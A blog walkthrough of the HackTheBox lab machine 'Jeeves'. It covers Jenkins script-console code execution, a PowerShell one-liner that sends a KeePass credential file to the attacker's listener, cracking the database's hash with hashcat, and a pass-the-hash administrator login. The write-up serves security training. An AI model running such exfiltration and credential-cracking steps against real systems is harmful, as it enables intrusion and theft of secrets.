---
title: "HTB Jeeves Walkthrough"
date: "2025-04-23"

layout: ../../layouts/PostLayout.astro
description: "Detail walkthrough on hackthebox machine jeeves."

img_path : "/images/jeeves/theme.png"
img_alt: "web image"
---

## Title: Jeeves

## About Chatterbox

Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path. 

---

## 1. The Process

### Enumeration

Let’s run nmap

![image.png](/images/jeeves/image1.png)

There are 4 tcp ports open, listening on Jeeves. 

On port 80, http server is running and its version is IIS httpd 10.0. On port 135 and 445 SMB is running and it’s version is  Windows RPC and microsoft-ds respectively. On port 50000 http server is running and its version is Jetty 9.4.

Let’s check the http server

**Port 80**

![image.png](/images/jeeves/image2.png)

Website is like an search engine. But as i press search button it shows error.

![image.png](/images/jeeves/image3.png)

But the error message is an image as we can’t highlight anything.

**Port 50000**

![image.png](/images/jeeves/image4.png)

For port 50000 we get 404 Not Found.

Using dirsearch, let’s find the hidden directories in that website. [link](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt) to wordlist.

![image.png](/images/jeeves/image5.png)

There is a askjeeves directory. Let’s check it.

![image.png](/images/jeeves/image6.png)

We see the jekins database. There are many things  in the jenkins dashboard. 

Let’s add a new item. After clicking on new item, give item name and select freestyle project.

![image.png](/images/jeeves/image7.png)

We will get this configuration form. Scroll at bottom and add build step. choose Execute Windows batch command.

![image.png](/images/jeeves/image8.png)

Right now I am going to run the whoami command. paste the following command in the command section.

```bash
cmd /c whoami 
```

![image.png](/images/jeeves/image9.png)

click on save.

![image.png](/images/jeeves/image10.png)

Now our item is ready. click on build now.

![image.png](/images/jeeves/image11.png)

On clicking that, it is shows up in the build history. click on that #1. 

![image.png](/images/jeeves/image12.png)

Result is given in Console Output tab. We can also run the script on script console tab.

### Exploitation

So with this knowledge, we will now execute a code to get the system shell using script console.

Click on manage jenkins, then click on script console. Paste the groovy script.For groovy script refer this [link](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) .

![image.png](/images/jeeves/image13.png)

To get the connection, start a netcat on your terminal and then run the script.

![image.png](/images/jeeves/image14.png)

Boom… we got the system shell.

![image.png](/images/jeeves/image15.png)

 On Jeeves the Jenkins application is running as  user kohsuke.

### user flag

![image.png](/images/jeeves/image16.png)

We found the user flag in kohsuke’s desktop.

### Privilege Escalation

Right now we are in system shell as a user. Now let’s get into as a administrator.

In the Documents folder we find a CEH.kdbx

![image.png](/images/jeeves/image17.png)

The data are all encrypted

![image.png](/images/jeeves/image18.png)

Let’s transfer this kdbx file to our machine and decrypt it. We can achieve this with netcat and powershell command.

In our machine start netcat

![image.png](/images/jeeves/image19.png)

Paste the follow command where the CEH.kdbx is located.

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.14',4444);$stream = $client.GetStream();$file = [System.IO.File]::ReadAllBytes('C:\Users\kohsuke\Documents\CEH.kdbx');$stream.Write($file, 0, $file.Length);$stream.Close();$client.Close()"
```

![image.png](/images/jeeves/image20.png)

![image.png](/images/jeeves/image21.png)

We have CEH.kdbx file, let’s decrypt it. I search on google and found that keepass2john is used to convert keepass file into hash. let’s do it.

![image.png](/images/jeeves/image22.png)

Using [hashes.com](http://hashes.com)  we can decrypt .kdbx to hash. From our CEH.kdbx we got the following hash.

```powershell
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

I used Hashcat with module 13400 for cracking KeePass hashes:

```bash
hashcat -m 13400 CEH.hash /home/tshering/THM/rockyou.txt -v
```

![image.png](/images/jeeves/image23.png)

So the hash content the password “moonshine1”.

I’ll use `kpcli` to extract passwords from the KeePass database. To connect, I just give it the `kdb` file and enter the master password when prompted:

![image.png](/images/jeeves/image24.png)

`find .` will list all the passwords:

![image.png](/images/jeeves/image25.png)

`show -f 0` will print the Backup stuff’s password:

![image.png](/images/jeeves/image26.png)

Let’s login to Administrator system using psexec.py  and password as this hash.

![image.png](/images/jeeves/image27.png)

Boom…finally we got the administrator system shell.

### root flag

Now let’s search the root flag

![image.png](/images/jeeves/image28.png)

There isn’t a root.txt file inside the Administrator user’s desktop. But a hm.txt says “The flag is elsewhere.  Look deeper.” Most probably it must be hidden. let’s check it.

![image.png](/images/jeeves/image29.png)

Yes it was hidden.

## 2. Learning

- Code execution is trivial with Jenkins. Simply creating a new item and adding a build step
(Execute Windows batch command) is all that is required.
- KDBX is the KeePass 2. x database file format, which is used for storing user data (user names, passwords, URLs, etc.).
- I have learned how to transfer the file from powershell to linux terminal.
- I have learned about the keepass2john.
- I have learned that kpcli is a command line interface to KeePass database files.
- In Windows, when you enter your password, it’s actually the hash of the password that the client sends to Windows.
- `dir /r` is used to display alternate data streams (ADS) of files in the directory. It shows hidden metadata associated with files, which is usually not visible during normal directory listings.

## 3. Reference List

[https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#extract-passwords](https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#extract-passwords)

[https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)

[Jeeves.pdf](/images/jeeves/jeeves.pdf)